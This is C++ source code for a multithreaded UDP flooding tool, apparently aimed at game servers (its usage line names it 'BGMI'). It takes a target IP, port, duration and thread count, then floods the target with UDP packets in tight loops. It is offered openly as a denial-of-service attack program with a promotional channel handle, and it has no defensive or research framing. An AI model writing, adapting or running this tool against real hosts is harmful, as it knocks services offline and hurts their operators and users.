#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <random>
#include <thread>
#include <atomic>

#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 20

// Attack class that encapsulates the attack logic
class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generate_payload(char *buffer, size_t size) {
        // Secure random number generator using C++11's random library
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<int> dist(0, 15);

        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[dist(gen)];
            buffer[i * 4 + 3] = "0123456789abcdef"[dist(gen)];
        }
        buffer[size * 4] = '\0';
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;

        char payload[PAYLOAD_SIZE * 4 + 1];
        generate_payload(payload, PAYLOAD_SIZE);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            return;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;
        ssize_t payload_size = strlen(payload);
        while (time(NULL) <= endtime) {
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                return;
            }
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

// Global flag to stop the attack gracefully on SIGINT
std::atomic<bool> stop_attack(false);

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    stop_attack = true;
}

// Function to handle each attack thread
void attack_task(std::shared_ptr<Attack> attack) {
    while (!stop_attack) {
        attack->attack_thread();
    }
}

void usage() {
    std::cout << "Usage: ./BGMI ip port duration threads\n";
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    // Signal handling for graceful shutdown
    std::signal(SIGINT, handle_sigint);

    // Vector to store the thread pool
    std::vector<std::thread> thread_pool;
    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    for (int i = 0; i < threads; i++) {
        auto attack = std::make_shared<Attack>(ip, port, duration);
        thread_pool.push_back(std::thread(attack_task, attack));
    }

    // Wait for threads to finish
    for (auto& t : thread_pool) {
        if (t.joinable()) {
            t.join();
        }
    }

    std::cout << "Attack finished. Join @GODxAloneBOY\n";
    return 0;
}